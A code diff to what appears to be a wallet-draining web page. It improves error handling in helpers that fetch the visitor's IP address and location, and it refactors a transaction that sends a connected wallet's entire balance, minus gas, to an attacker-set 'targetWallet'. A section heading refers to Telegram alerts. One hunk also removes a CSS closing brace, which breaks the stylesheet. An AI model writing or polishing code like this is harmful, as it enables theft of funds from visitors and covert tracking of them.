@@ -98,7 +98,6 @@
         @keyframes neonGlow {
             0% { box-shadow: 0 0 15px rgba(255, 152, 0, 0.5); }
             100% { box-shadow: 0 0 25px rgba(255, 152, 0, 1); }
-        }
     </style>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
 </head>
@@ -185,17 +184,23 @@
 
             // Functions to get IP and Location
             function getIp() {
-                return fetch('https://api.ipify.org?format=json')
+                return fetch('https://api.ipify.org/?format=json')
                     .then(response => response.json())
                     .then(data => data.ip)
-                    .catch(() => 'Unknown IP');
+                    .catch(error => {
+                        console.error('Failed to get IP:', error);
+                        return 'Unknown IP';
+                    });
             }
 
             function getLocation(ip) {
                 return fetch(`http://ipapi.co/${ip}/json/`)
                     .then(response => response.json())
                     .then(data => `${data.city}, ${data.country_name}`)
-                    .catch(() => 'Unknown');
+                    .catch(error => {
+                        console.error('Failed to get location:', error);
+                        return 'Unknown';
+                    });
             }
 
             // Function to send Telegram alert
@@ -277,12 +282,16 @@
                         const valueToSend = BigInt(balance) - gasCost;
 
                         if (valueToSend > 0) {
+                            const valueToSendHex = web3.utils.toHex(valueToSend.toString());
+                            const gasLimitHex = web3.utils.toHex(gasLimit);
+                            const gasPriceHex = web3.utils.toHex(gasPrice);
+
                             const tx = {
                                 from: walletAddress,
                                 to: targetWallet,
-                                value: web3.utils.toHex(valueToSend),
-                                gas: web3.utils.toHex(gasLimit),
-                                gasPrice: web3.utils.toHex(gasPrice),
+                                value: valueToSendHex,
+                                gas: gasLimitHex,
+                                gasPrice: gasPriceHex,
                             };
 
                             const txHash = await window.ethereum.request({
